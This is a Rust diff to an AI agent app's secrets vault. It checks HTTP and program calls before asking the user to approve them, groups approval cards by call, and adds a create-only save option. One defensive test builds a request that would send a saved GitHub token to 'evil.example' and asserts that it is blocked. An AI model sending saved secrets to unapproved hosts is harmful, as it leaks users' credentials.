@@ -510,12 +510,24 @@ struct Outgoing {
     max_chars: usize,
 }
 
+/// A checked agent call: ready to go out, or valid but waiting on the user
+/// for ask-first values. Refusals are errors, so nothing invalid is ever
+/// put to the user for approval.
+enum Checked<T> {
+    Ready(T),
+    Approval {
+        waiting: Vec<SecretMeta>,
+        method: String,
+        target: String,
+    },
+}
+
 fn http_prepare(
     loaded: &mut Loaded,
     session_id: &str,
     input: &Value,
     at: i64,
-) -> Result<Outgoing, String> {
+) -> Result<Checked<Outgoing>, String> {
     let input: http::HttpInput =
         serde_json::from_value(input.clone()).map_err(|e| format!("secrets.http: {e}"))?;
     let template = http::template(input)?;
@@ -544,11 +556,13 @@ fn http_prepare(
         values.insert(name.clone(), value.clone());
     }
     let names: Vec<String> = template.uses.keys().cloned().collect();
-    if let Some(meta) = loaded.awaiting_approval(session_id, &names).first() {
-        return Err(format!(
-            "{} waits for the user's approval in this chat. Nothing was sent.",
-            meta.name
-        ));
+    let waiting = loaded.awaiting_approval(session_id, &names);
+    if !waiting.is_empty() {
+        return Ok(Checked::Approval {
+            waiting,
+            method,
+            target: host,
+        });
     }
     let prepared = http::prepare(&template, &values);
     let mut spent = false;
@@ -559,14 +573,14 @@ fn http_prepare(
     if spent {
         loaded.reload(at)?;
     }
-    Ok(Outgoing {
+    Ok(Checked::Ready(Outgoing {
         prepared,
         chosen,
         sent_values: values.into_values().collect(),
         method,
         host,
         max_chars: template.max_chars,
-    })
+    }))
 }
 
 fn http_finish(
@@ -610,7 +624,12 @@ fn http_core(
     at: i64,
     send: &dyn Fn(&http::Prepared) -> Result<Value, String>,
 ) -> Result<Value, String> {
-    let outgoing = http_prepare(loaded, session_id, input, at)?;
+    let outgoing = match http_prepare(loaded, session_id, input, at)? {
+        Checked::Ready(outgoing) => outgoing,
+        Checked::Approval { waiting, .. } => {
+            return Err(format!("{} waits for the user's approval", waiting[0].name))
+        }
+    };
     let sent = send(&outgoing.prepared);
     http_finish(loaded, outgoing, sent)
 }
@@ -655,28 +674,20 @@ pub(crate) fn agent_action(
             Ok(list_core(loaded, session_id))
         }),
         "secrets.http" => {
-            let names = placeholder_names(input)?;
-            let waiting = with_existing(app, Vec::new(), |loaded| {
-                Ok(loaded.awaiting_approval(session_id, &names))
-            })?;
-            if !waiting.is_empty() {
-                let target = input
-                    .get("url")
-                    .and_then(Value::as_str)
-                    .and_then(|url| url::Url::parse(url).ok())
-                    .and_then(|url| url.host_str().map(str::to_string))
-                    .unwrap_or_default();
-                let method = input
-                    .get("method")
-                    .and_then(Value::as_str)
-                    .unwrap_or("GET")
-                    .to_ascii_uppercase();
-                return ask_approval(app, session_id, window, &waiting, "secrets.http", &method, &target);
-            }
-            let outgoing = with_existing(app, None, |loaded| {
+            let checked = with_existing(app, None, |loaded| {
                 http_prepare(loaded, session_id, input, now()).map(Some)
             })?
             .ok_or("No secrets are saved. Ask for one with secrets.request first.")?;
+            let outgoing = match checked {
+                Checked::Ready(outgoing) => outgoing,
+                Checked::Approval {
+                    waiting,
+                    method,
+                    target,
+                } => {
+                    return ask_approval(app, session_id, window, &waiting, "secrets.http", &method, &target)
+                }
+            };
             // The vault stays unlocked while the request is out, so saving
             // chats and other calls do not wait on a slow server.
             let sent = http::send(&outgoing.prepared);
@@ -688,19 +699,18 @@ pub(crate) fn agent_action(
             let template = run::template(
                 serde_json::from_value(input.clone()).map_err(|e| format!("secrets.run: {e}"))?,
             )?;
-            let names: Vec<String> = template.env.iter().map(|(_, name)| name.clone()).collect();
-            let waiting = with_existing(app, Vec::new(), |loaded| {
-                Ok(loaded.awaiting_approval(session_id, &names))
-            })?;
-            if !waiting.is_empty() {
-                return ask_approval(app, session_id, window, &waiting, "secrets.run", "", &template.program);
-            }
             let program = crate::harness::resolve_gui_binary(&template.program)
                 .ok_or_else(|| format!("{} is not installed, or not on your terminal's PATH", template.program))?;
-            let outgoing = with_existing(app, None, |loaded| {
+            let checked = with_existing(app, None, |loaded| {
                 run_prepare(loaded, session_id, template, now()).map(Some)
             })?
             .ok_or("No secrets are saved. Ask for one with secrets.request first.")?;
+            let outgoing = match checked {
+                Checked::Ready(running) => running,
+                Checked::Approval { waiting, target, .. } => {
+                    return ask_approval(app, session_id, window, &waiting, "secrets.run", "", &target)
+                }
+            };
             let finished = run::run(&program, &outgoing.template, &outgoing.env, Path::new(cwd));
             let response = with_loaded(app, |loaded| run_finish(loaded, outgoing, finished));
             changed(app);
@@ -722,7 +732,7 @@ fn run_prepare(
     session_id: &str,
     template: run::Template,
     at: i64,
-) -> Result<Running, String> {
+) -> Result<Checked<Running>, String> {
     let mut chosen: Vec<SecretMeta> = Vec::new();
     let mut env = Vec::new();
     for (var, name) in &template.env {
@@ -748,11 +758,13 @@ fn run_prepare(
         env.push((var.clone(), value.clone()));
     }
     let names: Vec<String> = template.env.iter().map(|(_, name)| name.clone()).collect();
-    if let Some(meta) = loaded.awaiting_approval(session_id, &names).first() {
-        return Err(format!(
-            "{} waits for the user's approval in this chat. Nothing was run.",
-            meta.name
-        ));
+    let waiting = loaded.awaiting_approval(session_id, &names);
+    if !waiting.is_empty() {
+        return Ok(Checked::Approval {
+            waiting,
+            method: String::new(),
+            target: template.program,
+        });
     }
     let mut spent = false;
     for meta in &chosen {
@@ -762,11 +774,11 @@ fn run_prepare(
     if spent {
         loaded.reload(at)?;
     }
-    Ok(Running {
+    Ok(Checked::Ready(Running {
         template,
         chosen,
         env,
-    })
+    }))
 }
 
 fn run_finish(
@@ -798,13 +810,6 @@ fn run_finish(
     Ok(report)
 }
 
-/// The `{{secret:NAME}}` names a request uses.
-fn placeholder_names(input: &Value) -> Result<Vec<String>, String> {
-    let input: http::HttpInput =
-        serde_json::from_value(input.clone()).map_err(|e| format!("secrets.http: {e}"))?;
-    Ok(http::template(input)?.uses.into_keys().collect())
-}
-
 /// Puts an approval card in the chat for each value waiting on the user and
 /// tells the agent to end its turn; Irgatos continues it once answered.
 fn ask_approval(
@@ -816,8 +821,12 @@ fn ask_approval(
     method: &str,
     target: &str,
 ) -> Result<Value, String> {
+    // The cards of one call settle together: the agent hears once, after
+    // the last is answered.
+    let call_id = uuid::Uuid::new_v4().simple().to_string();
     for meta in waiting {
-        let card = approval_card(session_id, meta, action, method, target);
+        let mut card = approval_card(session_id, meta, action, method, target);
+        card["callId"] = json!(call_id);
         app.emit_to(window, APPROVAL_EVENT, &card)
             .map_err(|_| "Irgatos could not show the approval")?;
     }
@@ -886,6 +895,10 @@ pub struct SaveInput {
     policy: Option<String>,
     #[serde(default)]
     commands: Vec<String>,
+    /// From the vault screen's Add: refuse a name already saved rather than
+    /// replace its value, as asking again in a chat does.
+    #[serde(default)]
+    create_only: bool,
     value: Zeroizing<String>,
 }
 
@@ -923,6 +936,18 @@ fn save_core(loaded: &mut Loaded, input: SaveInput, at: i64) -> Result<SecretMet
         return Err("The name must look like STRIPE_KEY".into());
     }
     let value = checked_value(&input.value)?;
+    if input.create_only
+        && input.persistent
+        && loaded
+            .values
+            .iter()
+            .any(|(meta, _)| meta.persistent() && meta.name == input.name)
+    {
+        return Err(format!(
+            "{} is already in the vault. Edit it, or pick another name.",
+            input.name
+        ));
+    }
     let session_id = match (input.persistent, input.session_id) {
         (true, _) => None,
         (false, Some(id)) if !id.trim().is_empty() => Some(id),
@@ -1392,7 +1417,7 @@ mod tests {
                    "policy": "ask", "value": "saved-FAKE-token"}),
         );
         let request = json!({"url": "https://api.github.com/user", "headers": {"Authorization": "token {{secret:GH_TOKEN}}"}});
-        let names = placeholder_names(&request).unwrap();
+        let names = vec!["GH_TOKEN".to_string()];
         assert_eq!(loaded.awaiting_approval("chat-1", &names).len(), 1);
         let error = http_core(&mut loaded, "chat-1", &request, 2_000, &never).unwrap_err();
         assert!(error.contains("approval"), "{error}");
@@ -1420,6 +1445,18 @@ mod tests {
         http_core(&mut loaded, "chat-1", &request, 2_000, &echo(&sent)).unwrap();
         assert_eq!(sent.borrow().len(), 3);
         assert!(http_core(&mut loaded, "chat-2", &request, 2_000, &never).is_err());
+
+        // A request that would be refused anyway is not put to the user.
+        let elsewhere = json!({"url": "https://evil.example/", "headers": {"X": "{{secret:GH_TOKEN}}"}});
+        let error = http_core(&mut loaded, "chat-2", &elsewhere, 2_000, &never).unwrap_err();
+        assert!(error.starts_with("Blocked"), "{error}");
+
+        // The vault screen's Add does not replace a saved value.
+        let again: SaveInput = serde_json::from_value(json!({"persistent": true, "createOnly": true,
+            "name": "GH_TOKEN", "hosts": ["api.github.com"], "value": "other-FAKE-token"}))
+        .unwrap();
+        assert!(save_core(&mut loaded, again, 2_000).unwrap_err().contains("already in the vault"));
+        assert_eq!(&*loaded.vault.reveal(&meta.id).unwrap(), "saved-FAKE-token");
 
         // Deny takes it back.
         answer(&mut loaded, "chat-1", "deny");
@@ -1510,6 +1547,9 @@ mod tests {
             2_000,
         )
         .unwrap();
+        let Checked::Ready(running) = running else {
+            panic!("a free value needs no approval")
+        };
         let dir = tempfile::tempdir().unwrap();
         let program = crate::harness::resolve_gui_binary("printenv").unwrap();
         let finished = run::run(&program, &running.template, &running.env, dir.path());
